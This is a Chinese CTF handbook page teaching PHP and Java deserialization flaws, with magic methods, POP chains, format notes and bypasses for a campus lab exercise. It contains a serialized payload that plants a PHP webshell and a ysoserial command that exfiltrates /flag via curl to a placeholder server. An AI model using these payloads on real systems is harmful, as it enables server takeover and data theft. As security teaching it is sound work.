---
title: 反序列化漏洞
order: 9
icon: mdi:code-braces
category:
  - CTF
  - 手册
  - Web
---

反序列化漏洞是指程序将用户可控的数据反序列化为对象，攻击者通过构造恶意序列化数据，触发程序中已有的危险代码（"魔术方法"），最终执行任意命令。

## 序列化与反序列化

```php
// 序列化：对象 → 字符串（存储/传输）
$obj = new User("admin");
$data = serialize($obj);
// 结果：O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化：字符串 → 对象（还原）
$obj = unserialize($data);
```

漏洞出现在：`unserialize($_GET['data'])` — 直接反序列化用户输入。

## PHP 魔术方法

PHP 在特定时机自动调用这些方法：

| 方法 | 触发时机 |
|------|---------|
| `__construct()` | 对象创建时 |
| `__destruct()` | 对象销毁时 |
| `__wakeup()` | 反序列化时 |
| `__toString()` | 对象被当字符串使用时 |
| `__invoke()` | 对象被当函数调用时 |
| `__call()` | 调用不存在的方法时 |

## 基础利用：POP 链

POP 链（Property-Oriented Programming）是把程序中已有的类和方法串联起来，构造出执行任意代码的调用链。

**示例**：

```php
class Logger {
    public $logfile;
    public $content;

    public function __destruct() {
        // 对象销毁时，把 content 写入 logfile
        file_put_contents($this->logfile, $this->content);
    }
}

// 构造恶意对象：写 WebShell
$evil = new Logger();
$evil->logfile = '/var/www/html/shell.php';
$evil->content = '<?php system($_GET["cmd"]); ?>';

echo serialize($evil);
// O:6:"Logger":2:{s:7:"logfile";s:23:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}
```

把序列化结果传给 `?data=...`，对象销毁时自动写入 WebShell。

## PHP 序列化格式速查

```
O:6:"Logger":2:{...}
│ │   │       │
│ │   │       └── 属性数量
│ │   └────────── 类名
│ └────────────── 类名长度
└──────────────── O = Object

s:7:"logfile"   → 字符串，长度7，值"logfile"
i:42            → 整数 42
b:1             → 布尔 true
N               → null
a:2:{...}       → 数组，2个元素
```

## 常见绕过

### `__wakeup` 绕过（CVE-2016-7124）

PHP < 5.6.25 / 7.0.10：序列化字符串中属性数量大于实际数量时，`__wakeup` 不会被调用：

```
O:6:"Logger":3:{...}   // 实际2个属性，写3，绕过 __wakeup
```

### 字符串逃逸

当程序对序列化字符串做了替换（如过滤某些词），可能导致字符串长度与实际不符，从而"逃逸"出额外的属性。

## Java 反序列化（了解）

Java 反序列化漏洞原理相同，常见工具：

```bash
# ysoserial：生成各种 Java 反序列化 Payload
java -jar ysoserial.jar CommonsCollections6 "curl http://your-server.com/$(cat /flag | base64)" > payload.ser
```

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [反序列化的代价](http://172.16.173.140/training/11?challenge=46) — 后端对用户输入执行了 `unserialize()`，构造 Payload 读取 `/flag`

## 练手资源

- CTFHub 反序列化技能树
- 攻防世界 PHP 反序列化题目
